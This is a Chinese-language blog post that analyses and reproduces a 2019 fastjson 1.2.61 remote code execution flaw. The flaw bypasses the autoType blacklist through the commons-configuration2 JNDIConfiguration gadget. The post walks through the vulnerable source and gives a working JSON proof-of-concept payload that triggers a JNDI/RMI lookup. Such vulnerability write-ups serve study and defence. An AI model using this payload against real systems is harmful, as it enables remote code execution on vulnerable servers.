---
layout: post
title:  fastjson 1.2.61远程代码执行漏洞分析&复现
date:   2019-9-24 10:22:07 +0800
categories: Web安全
tag: 漏洞预警
---

* content
{:toc}

{%raw%}  

## 0x00 前言  

9月19日fastjson官方发布了1.2.61新版本，增加了autoType安全黑名单。但是新版本刚发布不到一周时间，又有大佬bypass其黑名单，成功绕过了安全防护，可以利用fastjson反序列化特性造成RCE。从漏洞公布的poc可知这次gadget是commons-configuration组件，该组件是java应用程序的配置管理类，用于协助管理各种格式的配置文件。  

## 0x01 影响版本  

fastjson：  `version <= 1.2.61`，目前官方还没发布补丁，通杀所有版本。  

## 0x02 漏洞分析  

造成漏洞的根因是fastjson反序列化JSON字符串时，会自动调用构造方法和get/setXXX方法，下面看一段fastjson反序列化JSON串的测试代码，先定义User类：  

```Java
package com.blacklist.test;

public class User {

    User(){
        System.out.println("构造方法被自动调用！");
    }

    private int age;
    private String name;
    private String address;

    public String getAddress() {
        System.out.println("getAddress方法被自动调用！");
        return address;
    }
    public void setAddress(String address) {
        System.out.println("setAddress方法被自动调用！");
        this.address = address;
    }
    public int getAge() {
        System.out.println("getAge方法被自动调用！");
        return age;
    }
    public void setAge(int age) {
        System.out.println("setAge方法被自动调用！");
        this.age = age;
    }
    public String getName() {
        System.out.println("getName方法被自动调用！");
        return name;
    }
    public void setName(String name) {
        System.out.println("setName方法被自动调用！");
        this.name = name;
    }
    //一个拥有返回值的get方法
    public String getTest(){
        System.out.println("getTest方法被自动调用！");
        return null;
    }
}

```

使用fastjson反序列化一段JSON字符串成User对象：  

```Java
package com.blacklist.test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class ExploitMain {

    public static void main(String[] args) {
        //使用@type指定该JSON字符串应该还原成何种类型的对象
        String userInfo = "{\"@type\":\"com.blacklist.test.User\",\"name\":\"curz0n\", \"age\":18}";
        //开启setAutoTypeSupport支持autoType
        ParserConfig.global.setAutoTypeSupport(true);
        //反序列化成User对象
        JSONObject user = JSON.parseObject(userInfo);
    }
}
```

执行代码，输出结果如下：  

```
构造方法被自动调用！
setName方法被自动调用！
setAge方法被自动调用！
getAddress方法被自动调用！
getAge方法被自动调用！
getName方法被自动调用！
getTest方法被自动调用！
```

可以看见fastjson反序列化字符串时会依次自动调用对象的构造方法，setXXX方法，getXXX方法。注意，被反序列化的字符串中没有address和getTest方法的相关的要素，但是fastjson依然自动调用了get方法。如果这些get/setXXX方法里面存在JNDI Reference注入漏洞（*这部分知识详情可参考笔者发布的上一篇文章[《CVE-2019-14540远程代码执行漏洞分析&复现》](https://curz0n.github.io/2019/09/20/cve-2019-14540/)*），那就可以借助fastjson的特性执行我们指定的任意代码，造成RCE。  
从公布的poc可知这次利用的gadget是[commons-configuration](https://github.com/apache/commons-configuration/blob/master/src/main/java/org/apache/commons/configuration2/JNDIConfiguration.java)组件的`org.apache.commons.configuration2.JNDIConfiguration.setPrefix(final String prefix)`方法，源码如下：  

```Java
    public void setPrefix(final String prefix)
    {
        this.prefix = prefix;

        // clear the previous baseContext
        baseContext = null;
    }
```

setPrefix方法就是初始化成员变量，并使baseContext等于null，逻辑很简单，看不出任何问题。那我们就先看一下JNDIConfiguration的构造方法，无参构造方法调用带1个参数的构造方法，然后new一个InitialContext对象，调用带有2个参数的构造方法，代码如下所示：  

```Java
    public JNDIConfiguration(final String prefix) throws NamingException
    {
        this(new InitialContext(), prefix);
    }
```

带两个参数的构造方法详情如下，把InitialContext对象赋值给成员变量context：  

```Java
    public JNDIConfiguration(final Context context, final String prefix)
    {
        this.context = context; //new InitialContext()
        this.prefix = prefix;
        initLogger(new ConfigurationLogger(JNDIConfiguration.class));
        addErrorLogListener();
    }
```

接着分析代码，看哪里调用了context变量，最后定位到getBaseContext方法，代码详情如下：  

```Java
    public Context getBaseContext() throws NamingException
    {
        if (baseContext == null)
        {
            baseContext = (Context) getContext().lookup(prefix == null ? "" : prefix);
        }

        return baseContext;
    }
```

因为在setPrefix方法中设置了baseContext等于null，所以会进入if判断，接着getContext方法返回InitialContext对象，并调用lookup方法，其传入的参数变量正好是setPrefix方法设置的参数变量，可以被用户控制，这是典型的JNDI Reference注入漏洞的代码特征。因为fastjson特性，会自动调用具有返回值的getXXX方法，所以可以断定getBaseContext方法可以造成远程代码执行漏洞。  

## 0x03 漏洞复现  

### 环境准备  

Eclipse工程结构如下：  

```
Configuration2_Gadget
│  .classpath
│  .project
│
├─.settings
│      org.eclipse.jdt.core.prefs
│
├─bin
│  └─com
│      └─fastjson1261
│              ExploitMain.class
│
├─libs
│      commons-configuration2-2.6.jar  //https://www-eu.apache.org/dist//commons/configuration/binaries/commons-configuration2-2.6-bin.zip
│      commons-lang3-3.9.jar  //https://www-eu.apache.org/dist//commons/lang/binaries/commons-lang3-3.9-bin.zip
│      commons-logging-1.2.jar  //https://www-us.apache.org/dist//commons/logging/binaries/commons-logging-1.2-bin.zip
│      commons-text-1.8.jar  //https://www-eu.apache.org/dist//commons/text/binaries/commons-text-1.8-bin.zip
│      fastjson-1.2.61.jar  //http://repo1.maven.org/maven2/com/alibaba/fastjson/
│
└─src
    └─com
        └─fastjson1261
                ExploitMain.java
```

### POC  

根据前面的漏洞分析，构造基于rmi协议的poc如下：  

```
String poc = "{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit-SERVER\"}";
```

启动RMI服务器，执行poc，熟悉的计算器应用被打开：  

![](/assets/images/2019-09-24-fastjson_1_2_61_blacklist_bypass/1.png)  


## 0x04 结语  

开源项目[fastjson-blacklist](https://github.com/LeadroyaL/fastjson-blacklist)工程记录了fastjson黑名单的明文信息，可以看见在fastjson 1.2.61版本中过滤了 version 1.x老版本的org.apache.commons.configuration.JNDIConfiguration，而这次利用的gadget是Apache Commons Configuration version 2.x新版本，其包名变成了org.apache.commons.configuration2，从而绕过了黑名单防护。  

**References:**  

[FastJson 1.2.61远程代码执行漏洞(From第三方jar包)](https://mp.weixin.qq.com/s?__biz=MzU3NzMxNDgwMA==&mid=2247483807&idx=1&sn=4e9a229fb32721b353c896e1a9fab1eb&chksm=fd07cb00ca704216e9f9f99f6f615014581eb3f9a8423e8213c4840e498241cf169ffe187343&mpshare=1&scene=23&srcid=&sharer_sharetime=1569291237460&sharer_shareid=b9dede03cd3f2e7d4dbf72830bcff7c6#rd)  

**版权声明：转载请注明出处，谢谢。[https://github.com/curz0n](https://github.com/curz0n)**  

{%endraw%}  














